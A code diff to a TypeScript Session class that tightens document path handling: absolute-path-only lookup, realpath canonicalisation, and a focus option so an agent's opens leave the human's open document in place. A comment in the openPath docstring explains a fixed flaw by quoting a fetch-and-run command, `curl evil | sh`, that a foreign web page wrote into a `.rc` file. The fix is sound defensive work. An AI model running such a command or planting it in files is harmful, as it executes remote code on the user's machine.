@@ -36,7 +36,7 @@ import {
   statSync,
   writeFileSync,
 } from "node:fs";
-import { basename, dirname, extname, join, resolve, sep } from "node:path";
+import { basename, dirname, extname, isAbsolute, join, relative, resolve, sep } from "node:path";
 import { writeFileAtomic } from "../../kit/wire/discovery.ts";
 import type {
   ChatMessage,
@@ -383,9 +383,15 @@ export class Session {
   findDoc(key: string): DocRecord | undefined {
     const bySlug = this.m.docs.find((d) => d.slug === key);
     if (bySlug) return bySlug;
-    const abs = resolve(key);
-    const byPath = this.m.docs.find((d) => d.original === abs);
-    if (byPath) return byPath;
+    // ⛔ ONLY AN ABSOLUTE key is a path (verify-pass fix 8): resolving a
+    // relative one here resolved it against the DAEMON's cwd. The CLI resolves
+    // against its own cwd and sends an absolute path.
+    if (isAbsolute(key)) {
+      const byPath = this.m.docs.find(
+        (d) => d.original === key || realOr(d.original) === realOr(key),
+      );
+      if (byPath) return byPath;
+    }
     const byName = this.m.docs.filter((d) => basename(d.original) === key || d.rel === key);
     return byName.length === 1 ? byName[0] : undefined;
   }
@@ -414,18 +420,23 @@ export class Session {
 
   /**
    * Open a document by its original's path: v1 is written from the original
-   * the first time.
+   * the first time. `focus: false` (the agent's implicit open through
+   * `version-new --doc <path>`) does not move the human's open document.
    *
    * ⛔ VERIFY-PASS FIX 1b — ADMISSION. Only a doc-type file INSIDE a context
    * entry is admitted; `context.add` stays the one way in. Before this, any
    * path of any type was opened, and Save then wrote it: a foreign web page
    * wrote `curl evil | sh` into a `.rc` file outside the context.
    */
-  openPath(rawPath: string): { slug: string; created: boolean } {
-    const abs = resolve(rawPath);
+  openPath(rawPath: string, opts: { focus?: boolean } = {}): { slug: string; created: boolean } {
+    const focus = opts.focus ?? true;
+    // The context's own spelling of the path: a caller whose cwd is a realpath
+    // (/private/var/… for /var/…, or through a symlinked folder) names the same
+    // file differently, and it must land on the same doc.
+    const abs = this.canonical(resolve(rawPath));
     const existing = this.m.docs.find((d) => d.original === abs);
     if (existing) {
-      this.m.openDoc = existing.slug;
+      if (focus) this.m.openDoc = existing.slug;
       this.persist();
       return { slug: existing.slug, created: false };
     }
@@ -461,9 +472,22 @@ export class Session {
     };
     this.m.docs.push(d);
     this.writeActive(d, text);
-    this.m.openDoc = d.slug;
+    if (focus) this.m.openDoc = d.slug;
     this.persist();
     return { slug: d.slug, created: true };
+  }
+
+  /** `abs` as the context spells it, when it is the same file by realpath. */
+  private canonical(abs: string): string {
+    if (locate(this.m.context, abs)) return abs;
+    const real = realOr(abs);
+    for (const e of this.m.context) {
+      const realRoot = realOr(e.root);
+      if (!real.startsWith(realRoot + sep)) continue;
+      const spelled = join(e.root, relative(realRoot, real));
+      if (locate(this.m.context, spelled)) return spelled;
+    }
+    return abs;
   }
 
   openSlug(slug: string): void {
